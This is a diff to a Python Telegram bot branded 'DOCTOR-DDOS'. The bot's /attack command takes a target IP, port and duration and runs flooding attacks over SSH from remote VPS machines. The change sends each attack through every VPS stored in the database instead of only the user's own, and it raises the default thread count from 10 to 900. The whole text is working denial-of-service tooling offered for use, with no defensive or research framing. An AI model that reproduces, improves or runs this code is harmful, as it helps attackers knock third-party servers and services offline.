@@ -239,19 +239,21 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
 
-    vps_data = vps_collection.find_one({"user_id": user_id})
-    if not vps_data:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ No VPS configured. Use /add_vps to add one!*", parse_mode='Markdown')
-        return
-
     target_ip, port, duration = args
     port = int(port)
     duration = int(duration)
 
-    # Notify user that the attack is starting
+    # Fetch all VPS data
+    all_vps_data = vps_collection.find()
+
+    if not all_vps_data:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ No VPS configured. Use /add_vps to add one!*", parse_mode='Markdown')
+        return
+
+    # Notify user that the attack is starting on all VPS
     await context.bot.send_message(
         chat_id=chat_id,
-        text=(f"*⚔️ Attack Launched! ⚔️*\n"
+        text=(f"*⚔️ Attack Launched on all VPS! ⚔️*\n"
               f"*🎯 Target: {target_ip}:{port}*\n"
               f"*🕒 Duration: {duration} seconds*\n"
               f"*💥 Powered By DOCTOR-DDOS*"),
@@ -260,11 +262,12 @@ async def attack(update: Update, context: CallbackContext):
 
     # Retrieve current settings
     settings = settings_collection.find_one() or {}
-    threads = settings.get("threads", 10)  # Default to 10 threads
-    packet_size = settings.get("packet_size", 4)  # Default to 512 bytes
+    threads = settings.get("threads", 900)  # Default to 10 threads
+    packet_size = settings.get("packet_size", 6)  # Default to 512 bytes
 
-    # Run the SSH command in the background
-    asyncio.create_task(run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context))
+    # Run the SSH command in the background for each VPS
+    for vps_data in all_vps_data:
+        asyncio.create_task(run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context))
 
     # Update the last attack time
     last_attack_time[user_id] = current_time
